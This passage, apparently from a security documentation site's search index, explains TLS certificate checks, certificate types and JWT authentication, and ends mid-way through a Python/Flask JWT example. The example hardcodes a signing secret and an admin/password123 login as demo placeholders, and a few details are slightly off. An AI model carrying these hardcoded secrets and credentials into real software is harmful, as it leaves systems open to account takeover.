\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502 example.com Certificate         \u2502\n            \u2502 - CN: example.com               \u2502\n            \u2502 - Public Key (RSA 2048)         \u2502\n            \u2502 - Signed by: DigiCert CA        \u2502\n            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502 DigiCert Intermediate Cert      \u2502\n            \u2502 - Signed by: DigiCert Root CA   \u2502\n            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 4: Browser Verifies Certificate\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBrowser:\n  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502 Verification Checklist:              \u2502\n  \u2502                                      \u2502\n  \u2502 \u2713 Domain name matches URL?           \u2502\n  \u2502   \"example.com\" == \"example.com\" \u2713   \u2502\n  \u2502                                      \u2502\n  \u2502 \u2713 Certificate not expired?           \u2502\n  \u2502   Valid: Jan 1 - Dec 31, 2024 \u2713      \u2502\n  \u2502                                      \u2502\n  \u2502 \u2713 Signed by trusted CA?              \u2502\n  \u2502   DigiCert Root CA in trust store \u2713  \u2502\n  \u2502                                      \u2502\n  \u2502 \u2713 Signature valid?                   \u2502\n  \u2502   Verify with CA's public key \u2713      \u2502\n  \u2502                                      \u2502\n  \u2502 \u2713 Not revoked?                       \u2502\n  \u2502   Check CRL/OCSP \u2713                   \u2502\n  \u2502                                      \u2502\n  \u2502 ALL CHECKS PASSED! \u2705                 \u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 5: Key Exchange\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBrowser:\n  - Generates random \"Pre-Master Secret\"\n  - Encrypts with server's PUBLIC KEY (from certificate)\n  - Sends to server\n\nBrowser \u2500\u2500\u25b6 Encrypted Pre-Master Secret\n            [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] \u2190 Encrypted with public key\n\nServer:\n  - Receives encrypted pre-master secret\n  - Decrypts with its PRIVATE KEY\n  - Both sides compute Session Key\n\nSTEP 6: Secure Communication\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBrowser \u25c0\u2500\u2500\u25b6 Server\n        All data encrypted with Session Key (AES-256)\n\n        GET /api/data [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] \u2190 Encrypted\n        Response: [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] \u2190 Encrypted\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Browser Address Bar Shows:           \u2502\n\u2502                                        \u2502\n\u2502  \ud83d\udd12 https://example.com                \u2502\n\u2502                                        \u2502\n\u2502  \u2705 Connection is secure               \u2502\n\u2502  \u2705 Certificate is valid               \u2502\n\u2502  \u2705 Issued by: DigiCert                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/encryption/#certificate-types","title":"Certificate Types","text":"<pre><code>DOMAIN VALIDATION (DV):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 Validates domain ownership only\n\u2713 Issued in minutes\n\u2713 Free (Let's Encrypt) or cheap\n\u2713 Shows: \ud83d\udd12 in browser\n\u2717 No company verification\nUse: Blogs, personal sites\n\nORGANIZATION VALIDATION (OV):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 Validates domain + organization\n\u2713 Issued in 1-3 days\n\u2713 Manual verification process\n\u2713 Shows: \ud83d\udd12 + company name\n\u2713 More trust\nUse: Business websites\n\nEXTENDED VALIDATION (EV):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 Highest validation level\n\u2713 Thorough company verification\n\u2713 Issued in 1-2 weeks\n\u2713 Shows: \ud83d\udd12 + Green bar + company name\n\u2713 Maximum trust\nUse: Banks, e-commerce, high-security\n\nWILDCARD CERTIFICATES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 Covers *.example.com\n\u2713 Secures all subdomains\n\u2713 Example: api.example.com, www.example.com\nUse: Multiple subdomains\n</code></pre>"},{"location":"security/encryption/#jwt-json-web-token","title":"JWT (JSON Web Token)","text":"<p>What is JWT?</p> <p>JWT is a compact, self-contained token format for securely transmitting information between parties as a JSON object. It's digitally signed, so it can be verified and trusted.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  JWT Structure                               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCOMPLETE JWT TOKEN:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\nSplit into 3 parts (separated by dots):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 HEADER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\u2502\n\u2502 Decoded:\n\u2502 {\n\u2502   \"alg\": \"HS256\",        \u2190 Algorithm\n\u2502   \"typ\": \"JWT\"           \u2190 Token type\n\u2502 }\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  .\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 PAYLOAD \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ\n\u2502\n\u2502 Decoded:\n\u2502 {\n\u2502   \"sub\": \"1234567890\",   \u2190 Subject (user ID)\n\u2502   \"name\": \"John Doe\",    \u2190 Custom claim\n\u2502   \"iat\": 1516239022,     \u2190 Issued at\n\u2502   \"exp\": 1516242622      \u2190 Expiration\n\u2502 }\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  .\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 SIGNATURE \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\u2502\n\u2502 Created by:\n\u2502 HMACSHA256(\n\u2502   base64UrlEncode(header) + \".\" +\n\u2502   base64UrlEncode(payload),\n\u2502   secret_key\n\u2502 )\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/encryption/#how-jwt-works","title":"How JWT Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                JWT Authentication Flow                       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 1: User Login\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Client  \u2502                           \u2502  Server  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                      \u2502\n     \u2502 POST /login                          \u2502\n     \u2502 {username: \"john\", password: \"***\"}  \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n     \u2502                                      \u2502\n     \u2502                                      \u2502 Verify credentials\n     \u2502                                      \u2502 \u2713 Valid!\n     \u2502                                      \u2502\n     \u2502                                      \u2502 Generate JWT:\n     \u2502                                      \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n     \u2502                                      \u2502 Header:\n     \u2502                                      \u2502 {alg: HS256, typ: JWT}\n     \u2502                                      \u2502\n     \u2502                                      \u2502 Payload:\n     \u2502                                      \u2502 {\n     \u2502                                      \u2502   sub: \"12345\",\n     \u2502                                      \u2502   name: \"John Doe\",\n     \u2502                                      \u2502   role: \"admin\",\n     \u2502                                      \u2502   iat: 1234567890,\n     \u2502                                      \u2502   exp: 1234571490\n     \u2502                                      \u2502 }\n     \u2502                                      \u2502\n     \u2502                                      \u2502 Sign with secret key\n     \u2502                                      \u2502\n     \u2502 Response: { token: \"eyJ...\" }        \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n     \u2502                                      \u2502\n     \u2502 Store token (localStorage/cookie)    \u2502\n     \u2502                                      \u2502\n\nSTEP 2: Access Protected Resource\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n     \u2502                                      \u2502\n     \u2502 GET /api/protected                   \u2502\n     \u2502 Authorization: Bearer eyJ...         \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n     \u2502                                      \u2502\n     \u2502                                      \u2502 Verify JWT:\n     \u2502                                      \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n     \u2502                                      \u2502 1. Extract token\n     \u2502                                      \u2502 2. Verify signature\n     \u2502                                      \u2502    using secret key\n     \u2502                                      \u2502 3. Check expiration\n     \u2502                                      \u2502 4. Validate claims\n     \u2502                                      \u2502\n     \u2502                                      \u2502 \u2713 Token valid!\n     \u2502                                      \u2502\n     \u2502                                      \u2502 Extract user info\n     \u2502                                      \u2502 from payload\n     \u2502                                      \u2502\n     \u2502 Response: { data: \"...\" }            \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n     \u2502                                      \u2502\n\nSTEP 3: Token Expired\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n     \u2502                                      \u2502\n     \u2502 GET /api/protected                   \u2502\n     \u2502 Authorization: Bearer eyJ... (old)   \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n     \u2502                                      \u2502\n     \u2502                                      \u2502 Verify JWT:\n     \u2502                                      \u2502 \u2717 Token expired!\n     \u2502                                      \u2502\n     \u2502 401 Unauthorized                     \u2502\n     \u2502 { error: \"Token expired\" }           \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n     \u2502                                      \u2502\n     \u2502 User must login again                \u2502\n     \u2502 (or use refresh token)               \u2502\n     \u2502                                      \u2502\n</code></pre>"},{"location":"security/encryption/#jwt-vs-session-tokens","title":"JWT vs Session Tokens","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              JWT vs Session Tokens                           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSESSION TOKENS (Server-side):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Client  \u2502                           \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n     \u2502                                 \u2502  \u2502  Session   \u2502  \u2502\n     \u2502 Login                           \u2502  \u2502   Store    \u2502  \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502  \u2502            \u2502  \u2502\n     \u2502                                 \u2502  \u2502 session123:\u2502  \u2502\n     \u2502 Session ID: \"session123\"        \u2502  \u2502 {user:john}\u2502  \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n     \u2502                                 \u2502                  \u2502\n     \u2502 Request + Session ID            \u2502                  \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 Lookup in store  \u2502\n     \u2502                                 \u2502 \u2713 Found user     \u2502\n     \u2502 Response                        \u2502                  \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                  \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u2705 Can revoke immediately\n\u2705 Server has full control\n\u274c Requires server-side storage\n\u274c Harder to scale (session replication)\n\u274c Not stateless\n\nJWT TOKENS (Stateless):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Client  \u2502                           \u2502  Server  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                      \u2502\n     \u2502 Login                                \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n     \u2502                                      \u2502\n     \u2502 JWT: \"eyJ...\" (contains user info)   \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n     \u2502                                      \u2502\n     \u2502 Request + JWT                        \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 Verify signature\n     \u2502                                      \u2502 (no DB lookup!)\n     \u2502 Response                             \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u2705 Stateless (no server storage)\n\u2705 Easy to scale\n\u2705 Works across services (microservices)\n\u2705 Contains user info (no DB lookup)\n\u274c Cannot revoke until expiration\n\u274c Token size larger than session ID\n\u274c Must keep tokens short-lived\n</code></pre>"},{"location":"security/encryption/#jwt-implementation-python","title":"JWT Implementation (Python)","text":"<pre><code>import jwt\nimport datetime\nfrom typing import Dict, Optional\nimport hashlib\nimport hmac\n\nclass JWTManager:\n    \"\"\"JWT token generation and validation\"\"\"\n\n    def __init__(self, secret_key: str, algorithm: str = 'HS256'):\n        \"\"\"\n        Initialize JWT manager\n\n        Args:\n            secret_key: Secret key for signing tokens\n            algorithm: Signing algorithm (HS256, RS256, etc.)\n        \"\"\"\n        self.secret_key = secret_key\n        self.algorithm = algorithm\n\n    def generate_token(self, user_id: str, username: str, \n                      role: str = 'user', expires_in: int = 3600) -&gt; str:\n        \"\"\"\n        Generate JWT token\n\n        Args:\n            user_id: Unique user identifier\n            username: Username\n            role: User role (admin, user, etc.)\n            expires_in: Token validity in seconds (default 1 hour)\n\n        Returns:\n            JWT token string\n        \"\"\"\n        now = datetime.datetime.utcnow()\n\n        payload = {\n            # Standard claims\n            'sub': user_id,                    # Subject (user ID)\n            'iat': now,                        # Issued at\n            'exp': now + datetime.timedelta(seconds=expires_in),  # Expiration\n            'nbf': now,                        # Not before\n\n            # Custom claims\n            'username': username,\n            'role': role\n        }\n\n        token = jwt.encode(payload, self.secret_key, algorithm=self.algorithm)\n        return token\n\n    def verify_token(self, token: str) -&gt; Optional[Dict]:\n        \"\"\"\n        Verify and decode JWT token\n\n        Args:\n            token: JWT token string\n\n        Returns:\n            Decoded payload if valid, None if invalid\n        \"\"\"\n        try:\n            payload = jwt.decode(\n                token, \n                self.secret_key, \n                algorithms=[self.algorithm]\n            )\n            return payload\n        except jwt.ExpiredSignatureError:\n            print(\"Token has expired\")\n            return None\n        except jwt.InvalidTokenError as e:\n            print(f\"Invalid token: {e}\")\n            return None\n\n    def refresh_token(self, old_token: str, expires_in: int = 3600) -&gt; Optional[str]:\n        \"\"\"\n        Generate new token from old token (refresh)\n\n        Args:\n            old_token: Current JWT token\n            expires_in: New token validity in seconds\n\n        Returns:\n            New JWT token or None if old token is invalid\n        \"\"\"\n        payload = self.verify_token(old_token)\n        if not payload:\n            return None\n\n        # Generate new token with same user info\n        return self.generate_token(\n            user_id=payload['sub'],\n            username=payload['username'],\n            role=payload['role'],\n            expires_in=expires_in\n        )\n\n# Flask API Example\nfrom flask import Flask, request, jsonify\nfrom functools import wraps\n\napp = Flask(__name__)\njwt_manager = JWTManager(secret_key='your-secret-key-keep-it-safe')\n\ndef token_required(f):\n    \"\"\"Decorator to protect routes with JWT authentication\"\"\"\n    @wraps(f)\n    def decorated(*args, **kwargs):\n        token = None\n\n        # Get token from Authorization header\n        if 'Authorization' in request.headers:\n            auth_header = request.headers['Authorization']\n            try:\n                # Format: \"Bearer &lt;token&gt;\"\n                token = auth_header.split(' ')[1]\n            except IndexError:\n                return jsonify({'error': 'Invalid authorization header'}), 401\n\n        if not token:\n            return jsonify({'error': 'Token is missing'}), 401\n\n        # Verify token\n        payload = jwt_manager.verify_token(token)\n        if not payload:\n            return jsonify({'error': 'Token is invalid or expired'}), 401\n\n        # Add user info to request context\n        request.current_user = payload\n\n        return f(*args, **kwargs)\n\n    return decorated\n\n@app.route('/api/login', methods=['POST'])\ndef login():\n    \"\"\"Login endpoint - returns JWT token\"\"\"\n    data = request.get_json()\n    username = data.get('username')\n    password = data.get('password')\n\n    # Verify credentials (in real app, check against database)\n    if username == 'admin' and password == 'password123':\n        # Generate JWT token\n        token = jwt_manager.generate_token(\n            user_id='12345',\n            username=username,\n            role='admin',\n            expires_in=3600  # 1 hour\n        )\n\n        return jsonify({\n            'message': 'Login successful',\n            'token': token,\n            'expires_in': 3600\n        }), 200\n    else:\n        return jsonify({'error': 'Invalid credentials'}), 401\n\n@app.route('/api/protected', methods=['GET'])\n@token_required\ndef protected():\n    \"\"\"Protected endpoint - requires valid JWT token\"\"\"\n    user = request.current_user\n\n    return jsonify({\n        'message': f'Hello {user[\"username\"]}!',\n        'user_id': 